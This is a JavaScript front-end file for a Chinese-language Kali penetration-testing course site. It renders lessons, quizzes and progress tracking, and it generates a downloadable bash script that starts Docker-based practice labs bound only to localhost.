const esc = s => String(s==null?'':s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
const allLessons = () => DATA.flatMap(m => m.lessons.map(l => ({...l, mod:m})));
const findLesson = id => allLessons().find(l => l.id === id);
const key = (lid,i) => lid + '#' + i;
const taskKey = (lid,i) => lid + '@' + i;
const isDone = (lid,i) => !!state.steps[key(lid,i)];
const lessonDone = l => l.steps.every((s,i) => isDone(l.id,i));
const lessonPart = l => l.steps.some((s,i) => isDone(l.id,i));
function lessonPct(l){
  const d = l.steps.filter((s,i)=>isDone(l.id,i)).length;
  return Math.round(d / l.steps.length * 100);
}
function totals(){
  let t=0,d=0;
  DATA.forEach(m=>m.lessons.forEach(l=>l.steps.forEach((s,i)=>{t++; if(isDone(l.id,i)) d++;})));
  return {t,d};
}

let toastTimer;
function toast(msg){
  const el = $('#toast'); el.textContent = msg; el.classList.add('show');
  clearTimeout(toastTimer); toastTimer = setTimeout(()=>el.classList.remove('show'), 1600);
}

/* ============ nav ============ */
function renderNav(){
  const cur = currentLessonId();
  let html = `<div class="nlink navspecial" data-master="1"><span>🐉 大师之路 · 段位与源码级专题</span></div>
  <div class="nlink navspecial" data-labs="1"><span>🎯 靶场中心 · 下载与一键部署</span></div>`;
  DATA.forEach(m=>{
    const tot = m.lessons.length;
    const done = m.lessons.filter(lessonDone).length;
    html += `<div class="mod"><span class="ic">${m.icon}</span>第 ${m.no} 章 · ${esc(m.short||m.name)}<em>${done}/${tot}</em></div>`;
    m.lessons.forEach(l=>{
      const cls = l.id===cur ? ' active' : '';
      const st = lessonDone(l) ? 'done' : (lessonPart(l) ? 'part' : '');
      html += `<div class="nlink${cls}" data-go="${l.id}"><span class="dot ${st}"></span><span>${esc(l.title)}</span></div>`;
    });
  });
  $('#nav').innerHTML = html;
  const {t,d} = totals();
  const pct = t ? Math.round(d/t*100) : 0;
  $('#sp-text').textContent = pct + '%';
  $('#sp-bar').style.width = pct + '%';
  $('#done-pill').textContent = `已完成 ${allLessons().filter(lessonDone).length} / ${allLessons().length} 节`;
}

function renderLesson(id){
  const l = findLesson(id);
  if(!l){ location.hash = ''; return; }
  state.last = id; saveState();

  const pct = lessonPct(l);
  let html = `<div class="crumbs">第 ${l.mod.no} 章 · ${esc(l.mod.short||l.mod.name)} · 第 ${l.mod.lessons.indexOf(l)+1}/${l.mod.lessons.length} 节</div>
  <h1>${esc(l.title)}</h1>
  <div class="meta">
    <span class="tag">⏱ ${esc(l.time)}</span>
    <span class="tag">📊 ${esc(l.level)}</span>
    ${(l.tags||[]).map(t=>`<span class="tag">#${esc(t)}</span>`).join('')}
    ${l.labs?`<span class="tag">🧪 ${l.labs.length} 个靶场任务</span>`:''}
    ${l.challenge?`<span class="tag">🔥 含进阶挑战</span>`:''}
    <span class="tag" id="lpct">进度 ${pct}%</span>
  </div>`;

  html += `<div class="card goal"><h3>🎯 学完这节，你能做到</h3><ul>${l.goal.map(g=>`<li>${esc(g)}</li>`).join('')}</ul></div>`;

  if(l.concepts && l.concepts.length){
    html += `<div class="concepts">${l.concepts.map(c=>`<div class="concept"><b>${esc(c.t)}</b><p>${esc(c.d)}</p></div>`).join('')}</div>`;
  }

  html += `<h2 class="sec">🧭 操作步骤 <small>蓝色是「这一步到底在干什么」，别只看命令</small></h2><div class="steps">`;

  l.steps.forEach((s,i)=>{
    const k = key(l.id,i);
    const done = isDone(l.id,i);
    if(s.try) TRY[k] = s.try;
    html += `<article class="step${done?' done':''}" id="s-${k.replace('#','-')}" data-k="${k}">
      <div class="step-head">
        <span class="num">${i+1}</span>
        <h3>${esc(s.title)}</h3>
        <label class="check"><input type="checkbox" data-check="${k}" ${done?'checked':''}><span>做完了</span></label>
      </div>`;

    if(s.cmd) html += `<div class="cmdwrap">
        <div class="cmdbar"><span class="d"></span><span class="d"></span><span class="d"></span><span style="margin-left:4px">terminal · kali</span><button data-copy="${k}">复制</button></div>
        <pre><code>${esc(s.cmd)}</code></pre>
      </div>`;

    if(s.why) html += `<div class="why"><span class="lab">为什么</span><p>${esc(s.why)}</p></div>`;
    if(s.out) html += `<div class="out"><span class="lab">看什么</span><p>${esc(s.out)}</p></div>`;

    if(s.try) html += `<div class="try" data-k="${k}">
        <div class="th">✍️ 自己敲一遍（写错会给你方向，不会扣分）</div>
        <div class="tryrow"><span class="pf">$</span><input placeholder="在这里输入命令，然后点验证" autocomplete="off" spellcheck="false"><button data-try="${k}">验证</button></div>
        <div class="trymsg" data-msg="${k}"></div>
      </div>`;

    if(s.hints && s.hints.length){
      html += `<div class="hints"><button class="hintbtn" data-hint="${k}" data-lv="0">💡 卡住了？看提示（共 ${s.hints.length} 条）</button><div class="hintlist" data-hl="${k}"></div></div>`;
    }
    html += `</article>`;
  });
  html += `</div>`;

  if(l.deep && l.deep.length){
    html += `<h2 class="sec">🔍 原理深挖 <small>知道怎么打，还要知道为什么成立</small></h2>
    <div class="deep">${l.deep.map(d=>`<div class="deepcard"><b>${esc(d.t)}</b><p>${esc(d.d)}</p></div>`).join('')}</div>`;
  }

  if(l.labs && l.labs.length){
    html += `<h2 class="sec">🧪 靶场实战任务 <small>在靶场里做一遍，比看十遍强</small></h2>
    <div class="card"><ul class="tasks">${l.labs.map((t,i)=>{
      const kk = taskKey(l.id,i), dn = !!state.tasks[kk];
      return `<li class="task${dn?' done':''}"><label style="display:flex;gap:9px;cursor:pointer;width:100%">
        <input type="checkbox" data-task="${kk}" ${dn?'checked':''}>
        <span><span class="tn">${i+1}.</span>${esc(t.task)}<br><span class="tiny muted">🎯 靶场：${esc(t.name)}</span></span>
      </label></li>`;
    }).join('')}</ul>
    <p class="tiny muted" style="margin:10px 0 0">做完打勾即可，任务进度单独记录，不影响课程进度。靶场下载与部署见左侧「靶场中心」。</p></div>`;
  }

  if(l.pitfalls && l.pitfalls.length){
    html += `<div class="pit"><b>⚠️ 新手最容易踩的坑</b><ul>${l.pitfalls.map(p=>`<li>${esc(p)}</li>`).join('')}</ul></div>`;
  }

  if(l.quiz){
    const answered = state.quiz[l.id];
    html += `<h2 class="sec">✅ 自测 <small>答对了才算真的懂</small></h2>
    <div class="quiz" data-q="${l.id}">
      <div class="q">${esc(l.quiz.q)}</div>
      ${l.quiz.opts.map((o,i)=>`<button class="opt" data-opt="${i}">${String.fromCharCode(65+i)}. ${esc(o)}</button>`).join('')}
      <div class="qexp" data-exp="${l.id}">${esc(l.quiz.exp)}</div>
    </div>`;
  }

  if(l.challenge && l.challenge.length){
    html += `<div class="chal"><b>🔥 进阶挑战 · 做完这节才算真的吃透</b><ol>${l.challenge.map(c=>`<li>${esc(c)}</li>`).join('')}</ol></div>`;
  }

  html += lessonTrail(l);

  const idx = allLessons().findIndex(x=>x.id===l.id);
  const prev = allLessons()[idx-1], next = allLessons()[idx+1];
  html += `<div class="lnav">
    ${prev?`<button class="btn ghost" data-go="${prev.id}">← <span><small>上一节</small>${esc(prev.title)}</span></button>`:'<span></span>'}
    ${next?`<button class="btn primary" data-go="${next.id}" style="margin-left:auto"><span><small style="color:#cfe0ff">下一节</small>${esc(next.title)}</span> →</button>`:`<span class="btn ghost" data-go="">返回学习地图</span>`}
  </div>`;

  $('#view').innerHTML = html;

  if(answered && l.quiz){
    const box = document.querySelector(`.quiz[data-q="${l.id}"]`);
    box.querySelectorAll('.opt').forEach((b,i)=>{
      if(i===l.quiz.a) b.classList.add('right');
      b.disabled = true; b.style.cursor='default';
    });
    box.querySelector('.qexp').classList.add('show');
  }
}

/* ============ labs page ============ */
let labCat = '全部';

function buildScript(){
  const L = [];
  L.push('#!/usr/bin/env bash');
  L.push('# Kali 学堂 · 靶场一键部署脚本');
  L.push('# 用法：sudo bash labs.sh        首次会拉取镜像，约 2-3 GB');
  L.push('# 说明：所有端口只绑定 127.0.0.1，不暴露到局域网；只启动容器类靶场');
  L.push('set -u');
  L.push('');
  L.push('command -v docker >/dev/null 2>&1 || { echo "未安装 Docker：sudo apt install -y docker.io"; exit 1; }');
  L.push('docker info >/dev/null 2>&1 || { echo "Docker 未运行：sudo systemctl start docker"; exit 1; }');
  L.push('');
  const dockers = LABS.filter(l => (l.run||'').indexOf('docker run') === 0);
  dockers.forEach((l,i)=>{
    L.push('# ---------- ' + (i+1) + '. ' + l.name + ' ----------');
    L.push('# ' + l.desc);
    L.push('# 访问：' + l.url + (l.login ? '    账号：' + l.login : ''));
    L.push(l.run.replace(/-p (\d+):/g, '-p 127.0.0.1:$1:'));
    L.push('');
  });
  L.push('echo');
  L.push('echo "===== 已启动的靶场 ====="');
  L.push('docker ps --format "table {{.Names}}\\t{{.Ports}}\\t{{.Status}}"');
  L.push('echo "重置某个靶场：docker rm -f <名字>"');
  L.push('# 虚拟机类靶场（Metasploitable / VulnHub / GOAD）请按靶场中心里的说明单独搭建');
  return L.join('\n');
}

function downloadScript(){
  const blob = new Blob([buildScript()], {type:'text/x-shellscript;charset=utf-8'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'labs.sh';
  document.body.appendChild(a);
  a.click();
  setTimeout(()=>{ URL.revokeObjectURL(a.href); a.remove(); }, 600);
  toast('labs.sh 已下载，放进 Kali 执行 bash labs.sh');
}
